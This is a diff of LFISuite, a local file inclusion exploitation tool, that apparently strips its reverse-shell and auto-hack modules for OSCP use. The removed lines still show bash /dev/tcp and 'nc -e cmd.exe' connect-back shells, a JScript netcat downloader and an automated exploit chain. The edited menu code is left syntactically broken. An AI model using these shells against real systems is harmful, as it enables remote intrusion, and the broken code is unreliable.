@@ -64,88 +64,6 @@ from random import randint
 netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
 LFS_VERSION = '1.13' # DO NOT MODIFY THIS FOR ANY REASON!!
 
-#--------- Auto-Hack Global Variables ----------#
-ahactive     = False
-ahurl        = ""
-ahenvurl     = ""
-ahlogurl     = ""
-ahfdurl      = ""
-ahwebsite    = ""
-ahfd_errPage = ""
-ahpath       = ""
-ahpaths      = []
-ahlogs       = []
-ahfd         = []
-ahenv        = []
-ahcnf        = []
-ahgen        = []
-#-----------------------------------------------#
-
-# ------------------ Reverse shell ------------------ #
-
-# for Windows
-wget_filename = ""
-nc_filename   = ""
-wget_js_content = ""
-
-# for Windows
-def initWindowsReverse():
-	global wget_filename
-	global wget_js_content
-	global nc_filename
-
-	if(len(wget_filename) > 0 and len(nc_filename) > 0):
-		return False
-
-	wget_num = generateRandom()[11:]
-	nc_num   = generateRandom()[11:]
-	wget_js_content = """var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("nc_%s.exe");""" %nc_num
-	wget_filename = "lfisuite_wget_%s.js" %wget_num
-	nc_filename = "nc_%s" %nc_num
-
-	return True
-
-reverseConn = "bash -i >& /dev/tcp/?/12340 0>&1" # pentest monkey's bash reverse shell
-victimOs = ""
-
-def windows_reverse_shell():
-	global reverseConn
-
-	if("?" in reverseConn):
-		print ("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
-		time.sleep(2)
-		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
-		portBack = raw_input("[*] Enter the port to connect to [default: 12340] -> ")
-		if(len(portBack) == 0):
-			portBack = 12340
-		reverseConn = "%s -nv %s %s -e cmd.exe" %(nc_filename,ipBack,portBack)
-
-def generic_reverse_shell():
-	global reverseConn
-
-	if("?" in reverseConn):
-		print ("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
-		time.sleep(2)
-		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
-		portBack = "notValidPort"
-		while(len(portBack) > 0 and (portBack.isdigit() is False or int(portBack) > 65535)):
-			portBack = raw_input("[*] Enter the port to connect to [default: 12340] -> ")
-		if(len(portBack) == 0):
-			portBack = 12340
-		reverseConn = "bash -i >& /dev/tcp/%s/%s 0>&1" %(ipBack,portBack)
-
-def checkIfReverseShell(cmd):
-	if(cmd == "reverse shell" or cmd == "reverseshell"):
-		return True
-	return False
-
-def checkIfWindows(path):
-	if(victimOs == "Windows" or (len(path) > 0 and "\windows\system32" in path.lower())): 
-		print ("\n[+] OS: Windows\n","white")
-		return True
-	return False
-# ----------------------------------------------------#
-
 #-------------------------------------------------------------------Generic------------------------------------------------------------#
 gen_headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
 		   	  'Accept-Language':'en-US;',
@@ -173,14 +91,15 @@ def banner():
 
 	"""
 
-	print "/*-------------------------------------------------------------------------*\\"
-	print "| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |"
-	print "|                                                                           |"
-	print "| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |"
-	print "|          data://, expect://, php://filter, access logs                    |"
-	print "|                                                                           |"
-	print "| Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |"
-	print "\*-------------------------------------------------------------------------*/\n"
+	print "/*-----------------------------------------------------------------------------------*\\"
+	print "| Local File Inclusion Automatic Scanne                                              |"
+	print "|                                                                                    |"
+	print "| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,                 |"
+	print "|          data://, expect://, php://filter, access logs                             |"
+	print "|                                                                                    |"
+	print "| Original Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |"
+	print "| OSCP-related modifications by Kevin O'Riley                                        |"
+	print "\*-----------------------------------------------------------------------------------*/\n"
 
 
 # this is needed by access_log and passthru
@@ -1663,89 +1582,6 @@ def scanner():
 
 #----------------------------------------------------------------------------------------------------------------------------------------#
 
-#---------------------------------------------------------------Auto Hack----------------------------------------------------------------#
-def run_autoHack():
-	global ahurl
-	global ahactive
-	global ahpaths
-	global ahlogs
-	global ahfd
-	global ahenv
-	global ahcnf
-	global ahgen
-	global ahenvurl
-	global ahlogurl
-	global ahwebsite
-	global ahpath
-	global ahfdurl
-	global ahfd_errPage
-
-	ahactive = True
-	ahurl = raw_input("[*] Enter the URL you want to try to hack (ex: 'http://site/vuln.php?id=') -> ")
-	ahurl = correctUrl(ahurl)
-	ahurl = checkHttp(ahurl)
-
-	scanner()
-
-	time.sleep(1)
-	# /proc/self/environ Exploitation
-	if(len(ahenv) > 0):
-		for env in ahenv:
-			print ("\n[*] Trying to exploit /proc/self/environ on '%s'.." %env, "yellow")
-			ahenvurl = env
-			run_self_environ()
-
-	time.sleep(1)
-	# php://input Exploitation
-	print ("\n[*] Trying to exploit php://input wrapper on '%s'.." %ahurl, "yellow")
-	run_phpinput()
-
-	time.sleep(1)
-	# Access Logs Exploitation
-	if(len(ahlogs) > 0):
-		for log in ahlogs:
-			if("access" in log):
-				print ("\n[*] Trying to exploit access logs' file on '%s'.." %log, "yellow")
-				ahlogurl = log
-				run_access_log()
-
-	time.sleep(1)
-	# /proc/self/fd Exploitation
-	if(len(ahfd) > 0):
-		ahfd_errPage = raw_input("[*] Enter a page to request which will produce an error visible in your /proc/self/fd logs (ex: 'http://site/robots.txt') -> ")
-		for fd in ahfd:
-			print ("\n[*] Trying to exploit /proc/self/fd on '%s'.." %fd, "yellow")
-			ahfdurl = fd
-			run_self_fd()
-
-	time.sleep(1)
-	# data:// Exploitation
-	print ("\n[*] Trying to exploit data:// wrapper on '%s'.." %ahurl, "yellow")
-	run_data()
-
-	time.sleep(1)
-	# expect:// Exploitation
-	print ("\n[*] Trying to exploit expect:// wrapper on '%s'.." %ahurl, "yellow")
-	run_expect()
-
-	time.sleep(1)
-	# phpinfo Exploitation
-	print ("\n[*] Trying to exploit phpinfo through '%s'.." %ahurl, "yellow")
-	ahwebsite = extractWebsiteFromUrl(ahurl)
-	ahpath = extractPathFromUrl(ahurl)
-
-	toadd = extractPathFromPaths()
-	if("<NOT APPLICABLE" not in toadd):
-		ahpath += toadd
-		run_phpinfo()
-
-	time.sleep(1)
-	# php://filter Exploitation
-	print ("\n[*] Trying to get some pages' content using php://filter on '%s'.." %ahurl, "yellow")
-	run_phpfilter()
-
-#----------------------------------------------------------------------------------------------------------------------------------------#
-
 banner()
 time.sleep(0.5)
 choice = "4"
@@ -1808,15 +1644,6 @@ while(validChoice is False):
 				echoice = raw_input("\n -> ")
 
 				if(echoice == "1" or echoice == "a"):
-				elif(echoice == "2" or echoice == "b"):
-				elif(echoice == "3" or echoice == "c"):
-				elif(echoice == "4" or echoice == "d"):
-				elif(echoice == "5" or echoice == "e"):
-				elif(echoice == "6" or echoice == "f"):
-				elif(echoice == "7" or echoice == "g"):
-				elif(echoice == "8" or echoice == "h"):
-				elif(echoice == "9" or echoice == "i"):
-				elif(echoice == "10" or echoice == "x"):
 				else:
 					invalidChoice()
 	else:
